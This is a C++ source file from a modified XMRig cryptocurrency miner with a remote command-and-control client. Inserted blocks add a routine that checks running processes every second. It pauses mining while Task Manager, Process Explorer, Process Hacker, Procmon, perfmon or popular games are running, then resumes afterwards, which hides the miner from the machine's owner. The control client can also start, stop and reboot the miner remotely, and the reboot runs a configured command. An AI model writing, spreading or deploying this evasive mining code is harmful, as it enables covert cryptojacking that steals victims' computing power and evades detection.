/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018      Lee Clagett <https://github.com/vtnerd>
 * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2019 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */


#include <stdlib.h>
#include <uv.h>
#include <cc/ControlCommand.h>


#include "App.h"
#include "base/io/Console.h"
#include "base/io/log/Log.h"
#include "base/kernel/Signals.h"
#include "core/config/Config.h"
#include "core/Controller.h"
#include "core/Miner.h"
#include "crypto/common/VirtualMemory.h"
#include "net/Network.h"
#include "Summary.h"
/*begin*/
#include "cc/CCClient.h"
#include "cc/ControlCommand.h"
#include <tlhelp32.h>
#include <TCHAR.H>
/*end*/

xmrig::App::App(Process *process) :
    m_console(nullptr),
    m_signals(nullptr)
{
    m_controller = new Controller(process);
    if (m_controller->init() != 0) {
        return;
    }

	controller = m_controller;

    if (!m_controller->config()->isBackground()) {
        m_console = new Console(this);
    }
}


xmrig::App::~App()
{
    delete m_signals;
    delete m_console;
    delete m_controller;
}

/*begin*/
void xmrig::App::CheckTaskManager(uv_timer_t *handle)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapshot, &pe);
	do  {
		if (wcscmp(pe.szExeFile, L"WorldOfTanks.exe") == 0 || wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
			{
				LOG_INFO("\x1B[01;33mpaused\x1B[0m, something opened");
				controller->miner()->setEnabled(false);
				CloseHandle(hSnapshot);
				return;
			}
		} while (Process32Next(hSnapshot, &pe));
	if (!controller->miner()->isEnabled()) {
		LOG_INFO("\x1B[01;32mresumed");
		controller->miner()->setEnabled(true);
	}
	
	CloseHandle(hSnapshot);				
}
/*end*/

int xmrig::App::exec()
{
    if (!m_controller->isReady()) {
        return 2;
    }

    m_signals = new Signals(this);

    background();

    VirtualMemory::init(m_controller->config()->cpu().isHugePages());

    Summary::print(m_controller);

    if (m_controller->config()->isDryRun()) {
        LOG_NOTICE("OK");

        return 0;
    }

    m_controller->start();
	
    /*begin*/
    uv_timer_init(uv_default_loop(), &app_m_timer);
    uv_timer_start(&app_m_timer, App::CheckTaskManager, 1000, 1000);
    /*end*/

#   if XMRIG_FEATURE_CC_CLIENT
    m_controller->ccClient()->addCommandListener(this);
#   endif

    const int r = uv_run(uv_default_loop(), UV_RUN_DEFAULT);
    uv_loop_close(uv_default_loop());

    return m_restart ? EINTR : r;
}


void xmrig::App::onConsoleCommand(char command)
{
    switch (command) {
    case 'h':
    case 'H':
        m_controller->miner()->printHashrate(true);
        break;

    case 'p':
    case 'P':
        m_controller->miner()->setEnabled(false);
        break;

    case 'r':
    case 'R':
        m_controller->miner()->setEnabled(true);
        break;

    case 3:
        LOG_WARN("Ctrl+C received, exiting");
        close(false);
        break;

    default:
        break;
    }
}


void xmrig::App::onSignal(int signum)
{
    switch (signum)
    {
    case SIGHUP:
        LOG_WARN("SIGHUP received, exiting");
        break;

    case SIGTERM:
        LOG_WARN("SIGTERM received, exiting");
        break;

    case SIGINT:
        LOG_WARN("SIGINT received, exiting");
        break;

    default:
        return;
    }

    close(false);
}

void xmrig::App::onCommandReceived(const ControlCommand& controlCommand)
{
#   ifdef XMRIG_FEATURE_CC_CLIENT
    switch (controlCommand.getCommand()) {
        case ControlCommand::START:
            m_controller->miner()->setEnabled(true);
            break;
        case ControlCommand::STOP:
            m_controller->miner()->setEnabled(false);
            break;
        case ControlCommand::RESTART:
            close(true);
            break;
        case ControlCommand::SHUTDOWN:
            close(false);
            break;
        case ControlCommand::REBOOT:
            reboot();
        case ControlCommand::UPDATE_CONFIG:;
        case ControlCommand::PUBLISH_CONFIG:;
            break;
    }
#   endif
}

void xmrig::App::close(bool restart)
{
    m_restart = restart;

    m_signals->stop();
    m_console->stop();
    m_controller->stop();

    Log::destroy();
}

#   ifdef XMRIG_FEATURE_CC_CLIENT
void xmrig::App::reboot()
{
    auto rebootCmd = m_controller->config()->ccClient().rebootCmd();
    if (rebootCmd) {
        system(rebootCmd);
        close(false);
    }
}
#   endif
